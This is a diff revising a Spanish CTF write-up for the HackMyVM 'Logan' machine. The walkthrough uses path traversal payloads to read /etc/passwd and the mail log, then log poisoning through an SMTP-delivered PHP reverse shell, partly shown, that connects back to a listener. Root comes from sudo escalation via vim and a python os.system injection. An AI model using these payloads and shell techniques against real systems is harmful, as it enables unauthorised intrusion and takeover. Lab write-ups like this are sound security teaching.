@@ -1,6 +1,43 @@
+---
+Estado: Completado
+Plataforma: HackMyVM
+SO: Linux
+Dificultad: Fácil
+VectorInicial: Path Traversal + Log Poisoning
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - www-data vía log poisoning
+ - logan mediante sudo vim
+Usuarios:
+ - www-data
+ - logan
+ - root
+Privesc:
+ - sudo vim
+ - sudo python3 /opt/learn_some_python.py
+Tecnicas:
+ - Network Discovery
+ - Service Enumeration
+ - Virtual Host Discovery
+ - Path Traversal
+ - Log Poisoning
+ - Reverse Shell
+ - User Pivoting
+ - Sudo Privilege Escalation
+Herramientas:
+ - arp-scan
+ - gomap
+ - whatweb
+ - gobuster
+ - wfuzz
+ - telnet
+ - penelope
+Fecha: 2026-02-05
+---
 <img width="355" height="374" alt="Pasted image 20260205084855" src="https://github.com/user-attachments/assets/855a466c-c049-4a1d-82a8-57041b5b4e7e" />
 
-Lo primero que tenemos que hacer es encontrar la IP de la maquina dentro de la red con el siguiente comando.
+Lo primero que tenemos que hacer es encontrar la IP de la máquina objetivo dentro de la red con el siguiente comando.
 
 ```bash
 sudo arp-scan -I eth1 --localnet
@@ -21,13 +58,15 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.846 seconds (138.68 hosts/sec). 3 responded
 ```
 
-Como estamos dentro de un entorno virtual nos fijamos en las que tienen una MAC que empieza por **08:00:** ya que hacen referencia a Virtualbox y obtenemos que la IP obgetivo es **10.0.11.10**.
+Como estamos dentro de un entorno virtual, nos fijamos en las que tienen una MAC que empieza por **08:00:**, ya que hacen referencia a VirtualBox, y obtenemos que la IP objetivo es **10.0.11.10**.
 
-Añadiremos la IP a la variable $TARGET para así no tener que recordarla en cada paso.
+Añadiremos la IP a la variable `$TARGET` para así no tener que recordarla en cada paso.
 
 ```bash
 settarget 10.0.11.10
 ```
+
+## Enumeración
 
 Ahora escanearemos los puertos y servicios para ver posibles vectores:
 
@@ -35,7 +74,7 @@ Ahora escanearemos los puertos y servicios para ver posibles vectores:
 gomap -s $TARGET
 ```
 
-Obtenemos el resultado siguiente:
+Obtenemos el siguiente resultado:
 
 ```bash
 PORT    STATE  SERVICE      VERSION
@@ -44,10 +83,10 @@ PORT    STATE  SERVICE      VERSION
 ```
 
 Tenemos dos puertos abiertos:
-- 25 para protocolo ftp
-- 80 para protocolo http/web
+- 25 para protocolo SMTP
+- 80 para protocolo HTTP/web
 
-Así mismo notamos que hay un posible dominio configurado **logan.hmv**, lo comprobaremos mas adelante.
+Así mismo, notamos que hay un posible dominio configurado: **logan.hmv**. Lo comprobaremos más adelante.
 
 Al poner la IP en el navegador comprobamos que necesitamos indicar el dominio:
 
@@ -71,7 +110,7 @@ ff02::2 ip6-allrouters
 10.0.11.10 logan.hmv
 ```
 
-Ahora si podemos entrar a la web desde la url http://logan.hmv
+Ahora sí podemos entrar a la web desde la URL `http://logan.hmv`.
 
 <img width="1045" height="531" alt="Pasted image 20260205102401" src="https://github.com/user-attachments/assets/f8263fcd-735a-4792-84f0-c50702f25c82" />
 
@@ -87,21 +126,21 @@ whatweb http://logan.hmv
 http://logan.hmv [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.0.11.10], JQuery[3.4.1], Script[text/javascript], Title[Logan], X-UA-Compatible[IE=edge]
 ```
 
-Tampoco obtenemos información relevante, así que probaremos con un reconocimiento de los directorios a ver si encontramos algo.
+Tampoco obtenemos información relevante, así que probaremos con un reconocimiento de directorios a ver si encontramos algo.
 
 ```bash
 gobuster dir -u http://logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 ```
 
-Al no obtener ningún resultado viable suponemos que podemos estar frente a subdominios, vamos a descubrirlos.
+Al no obtener ningún resultado viable, suponemos que podemos estar frente a subdominios, así que vamos a descubrirlos.
 
 ```bash
 wfuzz -c --hc=404 --hl=1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.logan.hmv" -u $TARGET
 ```
 
-Con lo que descubrimos que hay un subdominio llamado **admin** lo cual nos lleva a un panel de control.
+Con esto descubrimos que hay un subdominio llamado **admin**, lo cual nos lleva a un panel de control.
 
-Pero para que funcione tenemos que añadir al fichero /etc/hosts este subdominio
+Pero para que funcione tenemos que añadir al fichero `/etc/hosts` este subdominio:
 
 ```txt
 127.0.0.1       localhost
@@ -117,35 +156,37 @@ ff02::2 ip6-allrouters
 
 <img width="979" height="525" alt="Pasted image 20260205105010" src="https://github.com/user-attachments/assets/0467cee2-e95e-44de-bf96-f85d10e1edd5" />
 
-Al ver que tenemos una opción para subir ficheros intentaremos realizar un RFI (Remote File Inclusion) para así obtener una Rever Shell.
+## Explotación
 
-Primero nos pondremos a la escucha por el puerto 443
+Al ver que tenemos una opción para subir ficheros, intentaremos abusar de esa funcionalidad para obtener ejecución remota y, con ello, una reverse shell.
+
+Primero nos pondremos a la escucha por el puerto 443.
 
 ```bash
 penelope -p 443
 ```
 
-Con el pluging de navegador **Hack-Tools** descargamos el código de Reverse Shell de Pentestmonkey's.
+Con el plugin de navegador **Hack-Tools** descargamos el código de la reverse shell de Pentestmonkey.
 
 <img width="759" height="598" alt="Pasted image 20260205105448" src="https://github.com/user-attachments/assets/6c434aab-624a-484b-8bf7-50e4886392c3" />
 
 Una vez descargado probamos a subirlo desde el panel.
 
-Parece que el fichero subió, pero no muestra información, tendremos que realizar un reconocimiento de directorios a ver donde puede estar.
+Parece que el fichero se subió, pero no muestra información, así que tendremos que realizar un reconocimiento de directorios para ver dónde puede estar.
 
 ```bash
 gobuster dir -u http://admin.logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 ```
 
-Pero tampoco encontramos nada, lo que nos indica que no hay subida de ficheros.
+Pero tampoco encontramos nada, lo que nos indica que no existe una ruta de subida accesible de forma directa.
 
-En la sección de *logs* tampoco encontramos nada así que solo nos queda la opción de *payments*.
+En la sección de *logs* tampoco encontramos nada, así que solo nos queda la opción de *payments*.
 
 <img width="414" height="92" alt="Pasted image 20260205113247" src="https://github.com/user-attachments/assets/a806411b-b3d0-43d3-a9e7-fa5ef005a8bc" />
 
-Se intenta con SQLi pero no hay resultados, esto nos da a pensar que es posible que podamos obtener un Path Traversal ya que los datos los tiene que leer de un fichero.
+Probamos con SQLi, pero no hay resultados. Esto nos da a pensar que es posible obtener un Path Traversal, ya que la aplicación parece leer los datos desde un fichero.
 
-Al probar a introducir la secuencia para ver el fichero *passwd* obtenemos el fichero indicado:
+Al probar a introducir la secuencia para ver el fichero `passwd` obtenemos el fichero indicado:
 
 ```txt
 ....//....//....//....//....//etc/passwd
@@ -153,7 +194,7 @@ Al probar a introducir la secuencia para ver el fichero *passwd* obtenemos el fi
 
 <img width="718" height="589" alt="Pasted image 20260205114041" src="https://github.com/user-attachments/assets/2f0f9638-1bc0-4822-b3e9-f98d2b17ffe0" />
 
-Teniendo la opción de leer ficheros nos da mas posibilidades y teniendo en cuenta que el puerto 25 esta abierto y es usado para el correo veamos si podemos leer el fichero de log del correo para hacer un Log Poisoning.
+Tener la opción de leer ficheros nos da más posibilidades y, teniendo en cuenta que el puerto 25 está abierto y es usado para el correo, veamos si podemos leer el fichero de log del correo para hacer un log poisoning.
 
 ```txt
 ....//....//....//....//....//var/log/mail.log
@@ -161,13 +202,13 @@ Teniendo la opción de leer ficheros nos da mas posibilidades y teniendo en cuen
 
 <img width="1199" height="837" alt="Pasted image 20260205122035" src="https://github.com/user-attachments/assets/2d020e5a-b13c-4ed7-93f5-474ee2e45a47" />
 
-Bien, ahora solo nos queda intentar un Reverse Shell inyectando código.
+Bien, ahora solo nos queda intentar inyectar código para conseguir una reverse shell.
 
-nos conectaremos vía telnet para enviar un mail interno, como tenemos el fichero **passwd** vemos que hay 2 usuarios:
+Nos conectaremos vía telnet para enviar un correo interno. Como ya hemos visto el contenido de **passwd**, comprobamos que hay 2 usuarios interesantes:
 - www-data
 - logan
 
-Usaremos a *logan* para enviar un mail a *www-data* con el siguiente payload en el cuerpo:
+Usaremos a *logan* como remitente para enviar un correo a *www-data* con el siguiente payload en el cuerpo:
 
 ```bash
 Trying 10.0.11.10...
@@ -259,7 +300,7 @@ DATA
   }
 
   // Set everything to non-blocking
-  // Reason: Occsionally reads will block, even though stream_select tells us they won't
+  // Reason: Occasionally reads will block, even though stream_select tells us they won't
   stream_set_blocking($pipes[0], 0);
   stream_set_blocking($pipes[1], 0);
   stream_set_blocking($pipes[2], 0);
@@ -280,7 +321,7 @@ DATA
       break;
     }
 
-    // Wait until a command is end down $sock, or some
+    // Wait until a command is sent down $sock, or some
     // command output is available on STDOUT or STDERR
     $read_a = array($sock, $pipes[1], $pipes[2]);
     $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
@@ -333,7 +374,7 @@ DATA
 250 2.0.0 Ok: queued as 9222C60A4F
 ```
 
-Ahora solo tenemos que usar el campo de búsqueda para lanzar el *payload* y como ya teníamos a **penelope** a la escucha enseguida obtenemos una *Reverse Shell*.
+Ahora solo tenemos que usar el campo de búsqueda para procesar el *payload* y, como ya teníamos a **penelope** a la escucha, enseguida obtenemos una *reverse shell*.
 
 ```txt
 ....//....//....//....//....//var/mail/www-data
@@ -341,7 +382,9 @@ Ahora solo tenemos que usar el campo de búsqueda para lanzar el *payload* y com
 
 <img width="931" height="705" alt="Pasted image 20260205124435" src="https://github.com/user-attachments/assets/ba0a49d5-3eee-4e04-8424-f856f82f58d7" />
 
-Ahora  tendremos que buscar flags y escalar privilegios.
+## Escalada de privilegios
+
+Ahora tendremos que buscar flags y escalar privilegios.
 
 La primera flag la encontramos en:
 
@@ -360,7 +403,7 @@ User www-data may run the following commands on logan:
     (logan) NOPASSWD: /usr/bin/vim
 ```
 
-Como podemos ver podemos realizar la escalada con ***vim*** así que vamos intentarlo.
+Como podemos ver, podemos realizar la escalada con **vim**, así que vamos a intentarlo.
 
 Buscaremos en la web https://gtfobins.org/ para encontrar el método correcto.
 
@@ -368,9 +411,9 @@ Buscaremos en la web https://gtfobins.org/ para encontrar el método correcto.
 sudo -u logan vim -c ':!/bin/bash'
 ```
 
-Cabe destacar que este comando no es 100% de la web ya que en la web hacen referencia al uso de ***vi*** pero nosotros solo tenemos que cambiar el nombre del ejecutable para que funcione.
+Cabe destacar que este comando no es exactamente el que aparece en la web, ya que allí hacen referencia al uso de **vi**, pero aquí basta con cambiar el nombre del ejecutable para que funcione.
 
-Ahora somo el usuario logan, pero queremos llegar a ser root, veamos si lo conseguimos.
+Ahora somos el usuario `logan`, pero queremos llegar a ser `root`, así que veamos si lo conseguimos.
 
 ```bash
 logan@logan:/$ sudo -l
@@ -381,13 +424,13 @@ User logan may run the following commands on logan:
     (root) NOPASSWD: /usr/bin/python3 /opt/learn_some_python.py
 ```
 
-Observamos que podemos ser **root** usando *python3* y el fichero de ejecución que se indica.
+Observamos que podemos llegar a ser **root** usando `python3` y el fichero que se indica.
 
 ```bash
 sudo /usr/bin/python3 /opt/learn_some_python.py
 ```
 
-Y ya conseguimos el acceso como *root*.
+Y con ello conseguimos acceso como `root`.
 
 ```bash
 Welcome!!!
@@ -398,12 +441,23 @@ import os; os.system("/bin/bash")
 root@logan:/
 ```
 
-Ahora solo queda obtener la flag.
+Ahora solo queda obtener la flag final.
 
+```bash
+root@logan:/# cat /root/root.txt
 ```
-root@logan:/# cat /root/root.tx
-```
+
+## Conclusión
+
+Esta máquina resulta interesante porque combina un **Path Traversal** con **log poisoning** para conseguir ejecución remota de código. A partir de ahí, la escalada es bastante directa mediante una mala configuración de `sudo`, primero para pivotar a `logan` con `vim` y después para escalar a `root` mediante `python3`.
+
+### Puntos clave aprendidos
+
+- Un **Path Traversal** puede convertirse en una vía de ejecución remota si permite leer logs controlables por el atacante.
+- Los servicios auxiliares, como el correo, pueden ser decisivos en una cadena de explotación.
+- Las configuraciones inseguras de `sudo` siguen siendo una fuente clásica y muy efectiva de escalada de privilegios.
+- Validar qué ficheros lee realmente una aplicación puede abrir la puerta a ataques encadenados muy potentes.
 
 ---
-Si te gusto puedes invitarme a un cafe.
+Si te gustó, puedes invitarme a un café.
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)
